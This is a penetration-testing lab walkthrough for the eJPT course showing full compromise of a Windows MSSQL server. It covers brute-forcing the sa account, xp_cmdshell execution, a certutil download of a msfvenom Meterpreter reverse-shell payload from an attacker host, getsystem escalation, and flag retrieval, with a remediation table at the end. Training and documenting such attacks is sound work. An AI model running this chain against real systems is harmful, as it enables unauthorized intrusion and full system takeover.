# 🔐 MSSQL Attack Path — eJPT Lab Walkthrough

> A detailed exploration of the **alternative method** to compromise a Windows target running Microsoft SQL Server. This walkthrough documents authentication, command execution, privilege escalation, and flag retrieval using valid credentials and Impacket.

---

## 📋 Lab Objective

Gain complete system compromise on a Windows target with exposed MSSQL service by:
1. Identifying MSSQL running on the network
2. Obtaining valid credentials through brute force
3. Executing OS commands via SQL Server
4. Obtaining a reverse shell
5. Escalating privileges to SYSTEM
6. Retrieving hidden flags

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and port scanning |
| `metasploit-framework` | MSSQL login scanner, multi/handler |
| `impacket-mssqlclient` | Direct MSSQL authentication and command execution |
| `msfvenom` | Meterpreter payload generation |
| `certutil` | File transfer from attacker to target |

---

## 🖥️ Lab Environment

| Component | Details |
|-----------|---------|
| **Target OS** | Windows Server (MSSQL enabled) |
| **Target Service** | Microsoft SQL Server (Port 1433/tcp) |
| **Attacking Machine** | Kali Linux |
| **Attack Vector** | MSSQL Brute Force → Command Execution → Privilege Escalation |

---

## ⚡ Attack Methodology

```
Reconnaissance  →  Enumeration  →  Authentication  →  Command Execution  →  Privilege Escalation  →  Flag Retrieval
```

---

## 📍 Step-by-Step Walkthrough

### **Step 1 — Initial Enumeration: Port Scanning**

**Objective:** Identify running services on the target.

**Command:**
```bash
nmap -sS -sV -p- -T4 <target-ip>
```

**Breakdown:**
- `-sS` — SYN stealth scan
- `-sV` — Service version detection
- `-p-` — Scan all ports (1–65535)
- `-T4` — Aggressive timing template

**Result:**
```
Port 1433/tcp OPEN — Microsoft SQL Server
```

💡 **Key Finding:** MSSQL was exposed on its default port (1433), confirming the attack surface.

![Nmap_Scan](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/1%20-%20Screenshot%202026-02-12%20133648.png)

---

### **Step 2 — MSSQL Authentication: Credential Brute Force**

**Objective:** Obtain valid SQL Server credentials.

**Tool:** Metasploit auxiliary module

**Command:**
```bash
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

**Configuration Details:**
- `RHOSTS` — Target IP address
- `USER_FILE` — Common username wordlist
- `PASS_FILE` — Common password wordlist
- The module iterates through username/password combinations

**Result:**
```
[+] MSSQL — Login Successful: WORKSTATION\sa
```

💡 **Key Finding:** The `sa` (System Administrator) account was vulnerable to brute force. The `WORKSTATION\sa` format indicates a local admin-level account.

**Vulnerability:** Default/weak credentials on SQL Server administrative accounts.

![Brute_Force](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/2%20-%20Screenshot%202026-02-12%20133758.png)
![Brute_Force](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/3%20-%20Screenshot%202026-02-12%20133954.png)
![Brute_force](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/4%20-%20Screenshot%202026-02-12%20134024.png)

---

### **Step 3 — Direct SQL Server Access: Impacket Authentication**

**Objective:** Establish an interactive session with MSSQL for direct command execution.

**Why Impacket?** While Metasploit modules are common, Impacket provides direct access to the SQL service without triggering additional exploitation modules.

**Command:**
```bash
impacket-mssqlclient sa@<target-ip>
```

When prompted for password, enter the password obtained from Step 2.

**Authentication Successful:**
```
[*] Inited with db.local as 192.168.x.x
[*] INTERACTIVE mode... type 'help' for available commands
```

💡 **Key Finding:** Direct MSSQL client authentication bypasses the need for exploitation modules, offering direct SQL command execution.

![Impacket](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/5%20-%20Screenshot%202026-02-12%20134117.png)


---

### **Step 4 — OS Command Execution via SQL Server**

**Objective:** Verify that operating system command execution is possible through SQL Server.

**Vulnerability:** The `xp_cmdshell` stored procedure allows SQL Server to execute OS-level commands. If enabled, this is a critical security misconfiguration.

**Command 1 — System Information:**
```sql
xp_cmdshell "systeminfo"
```

**Result:**
System information is displayed, confirming command execution capability.

**Command 2 — Directory Enumeration:**
```sql
xp_cmdshell "dir C:\"
```

**Result:**
```
Directory listing of C:\ is displayed
FLAG1.txt located in C:\
```

💡 **Critical Finding:** `xp_cmdshell` was enabled, allowing arbitrary OS command execution. This is a **CVSS 9.8 (Critical)** vulnerability.

![Command_Shell](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/6%20-%20Screenshot%202026-02-12%20134131.png)
![Command_Shell](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/7%20-%20Screenshot%202026-02-12%20134227.png)
![Command_Shell_Flag](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/8%20-%20Screenshot%202026-02-12%20134250.png)

**FLAG 1 Retrieved.**

---

### **Step 5 — Obtaining a Reverse Shell**

**Objective:** Establish a proper Meterpreter reverse shell for more convenient access and further exploitation.

**Why?** While `xp_cmdshell` works, it's limited. A full Meterpreter shell provides better interaction, privilege escalation tools, and post-exploitation modules.

#### **Step 5a — Payload Generation**

**Command:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o shell.exe
```

**Breakdown:**
- `-p` — Payload type (Windows Meterpreter, reverse TCP)
- `LHOST` — Attacker IP to connect back to
- `LPORT` — Listening port
- `-f exe` — Output format (Windows executable)
- `-o shell.exe` — Output filename

**Result:** `shell.exe` created locally on the attacking machine.

![Meterpreter](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/9%20-%20Screenshot%202026-02-12%20134444.png)

---

#### **Step 5b — File Transfer to Target**

**First Attempt (Failed):**
```sql
xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:8000/shell.exe shell.exe"
```
![Failed](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/10%20-%20Screenshot%202026-02-12%20134711.png)
**Error:** Access denied. The current MSSQL service context (typically NETWORK SERVICE) lacks write permissions in the default directory.

**Second Attempt (Success):**

Create a writable directory first:
```sql
xp_cmdshell "mkdir C:\Temp"
```
![Temp](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/11%20-%20Screenshot%202026-02-12%20134722.png)
Then transfer to the writable location:
```sql
xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:8000/shell.exe C:\Temp\shell.exe"
```

**Result:**
```
[*] File successfully transferred to C:\Temp\shell.exe
```

💡 **Key Learning:** Understanding file system permissions and service contexts is crucial. The MSSQL service runs under a specific user account with limited privileges — exploitation must account for this.

![Success](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/12%20-%20Screenshot%202026-02-12%20134802.png)

---

#### **Step 5c — Reverse Shell Establishment**

**On Attacking Machine — Start Listener:**
```bash
msfconsole
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run
```
![Payload_Setup](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/13%20-%20Screenshot%202026-02-12%20134939.png)
**On Target Machine — Execute Payload:**
```sql
xp_cmdshell "C:\Temp\shell.exe"
```
![Running](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/14%20-%20Screenshot%202026-02-12%20135026.png)
**Result:**
```
[*] Meterpreter session opened (192.168.x.x:4444 -> 192.168.x.x:random-port)
meterpreter >
```

💡 **Milestone:** You now have an interactive Meterpreter shell with the privileges of the MSSQL service account.

![Payload_Success](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/15%20-%20Screenshot%202026-02-12%20135034.png)

---

### **Step 6 — Verifying Current User Context**

**Objective:** Understand what privileges we currently have before escalation.

**Command:**
```bash
getuid
```

**Result:**
```
Server username: WORKSTATION\MSSQL_SERVICE_ACCOUNT
```

💡 **Analysis:** The MSSQL service runs under a service account with limited privileges. Privilege escalation is necessary to access protected system areas (like registry, System32\config).

![Config](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/17%20-%20Screenshot%202026-02-12%20135201.png)

---

### **Step 7 — Privilege Escalation: SeImpersonatePrivilege Exploitation**

**Objective:** Escalate from service account to SYSTEM (NT AUTHORITY\SYSTEM).

**Privilege Assessment:**

```bash
getprivs
```

**Result:**
```
SeImpersonatePrivilege — Enabled
SeChangeNotifyPrivilege — Enabled
...
```

💡 **Critical Finding:** `SeImpersonatePrivilege` is enabled. This privilege allows impersonation of other user tokens, making the system vulnerable to privilege escalation attacks.

**Exploitation:**

```bash
getsystem
```

Meterpreter automatically uses available privilege escalation techniques (such as token impersonation or Potato variants) to elevate to SYSTEM.

**Result:**
```
[+] Privilege escalated to: NT AUTHORITY\SYSTEM
```
![Privilege_Escalation](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/19%20-%20Screenshot%202026-02-12%20135224.png)
**Verification:**
```bash
getuid
```

**Result:**
```
Server username: NT AUTHORITY\SYSTEM
```

💡 **Milestone:** You now have full system-level privileges.

![NT_AUTORITY](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/20%20-%20Screenshot%202026-02-12%20135239.png)
![NT_AUTORITY](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/21%20-%20Screenshot%202026-02-12%20135323.png)

---

### **Step 8 — Accessing Protected Directories: Flag 2 & 3**

**Objective:** Locate and retrieve hidden flags now that SYSTEM access is obtained.

#### **Attempting Initial Access (Pre-Escalation)**

Before escalation, attempting to access Windows configuration:
```bash
cat C:\Windows\System32\config\SAM
```

**Error:** Access denied. The SAM hive is protected even from admin service accounts.

---
![Access_Deniad](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/22%20-%20Screenshot%202026-02-12%20135337.png)
![Found](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/23%20-%20Screenshot%202026-02-12%20135440.png)
#### **Post-Escalation Access**

After escalation to SYSTEM:
```bash
dir C:\Windows\System32\config
```

**Result:** Files are now accessible.

**FLAG 2 Found:** Retrieved from `C:\Windows\System32\config\FLAG2.txt`

**Targeted Search for Additional Flags:**

```bash
search -d C:\Windows\System32 -f *.txt
```

**Result:**
```
Found: C:\Windows\System32\EscalatePrivilegeToGetThisFlag.txt
```

Reading the file:
```bash
cat C:\Windows\System32\EscalatePrivilegeToGetThisFlag.txt
```

💡 **Key Learning:** The file naming convention is a hint — privilege escalation was required to access this flag. This teaches that enumeration should guide exploitation direction.

---

### **Step 9 — Final Flag: Administrator Profile**

**Objective:** Complete the challenge by retrieving the final flag.

**Hint from Step 8:** "Check the Administrator directory."

**Command:**
```bash
dir C:\Users\Administrator\Desktop
```

**Result:**
```
FLAG4.txt located
```

**Reading the Final Flag:**
```bash
cat C:\Users\Administrator\Desktop\FLAG4.txt
```

**FLAG 4 Retrieved.**

![Final_Flag](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/24%20-%20Screenshot%202026-02-12%20135755.png)

---

## 🎯 Key Vulnerabilities Exploited

| Vulnerability | CVSS Score | Description | Remediation |
|---|---|---|---|
| **Exposed MSSQL Service** | 7.5 | MSSQL running on default port without network segmentation | Restrict MSSQL to internal networks only |
| **Weak SQL Server Credentials** | 9.8 | `sa` account with weak/default password | Enforce strong password policies; disable `sa` account |
| **xp_cmdshell Enabled** | 9.8 | OS command execution via SQL stored procedure | Disable `xp_cmdshell` unless absolutely necessary |
| **SeImpersonatePrivilege** | 8.8 | Service account with token impersonation privilege | Run MSSQL service under least-privilege account; disable unnecessary privileges |
| **Insecure File Transfer** | 6.5 | Transferring unsigned executables over HTTP | Implement code signing and HTTPS; use secure transfer methods |

---

## 💡 Key Learnings

✅ **Valid credentials trump exploitation** — When access is obtained through auth, it's often easier than exploiting unpatched services.

✅ **Enumeration drives decisions** — The MSSQL login scanner revealed credentials, which changed the entire approach.

✅ **Service context matters** — Understanding that MSSQL runs under a service account guided the privilege escalation strategy.

✅ **Multiple paths exist** — This lab could have been solved using Metasploit exploitation modules, but the credential-based path was cleaner and more realistic.

✅ **SeImpersonate is critical** — Token impersonation privileges on service accounts are a high-risk configuration.

✅ **Tools beyond the course are valuable** — Impacket wasn't covered in eJPT material, but exploring it independently proved invaluable.

---
## 👤 Author

**Abin Watson**  
Penetration Tester | eJPT Certified  
Specialising in Networks, Hosts, Endpoints & Web Applications
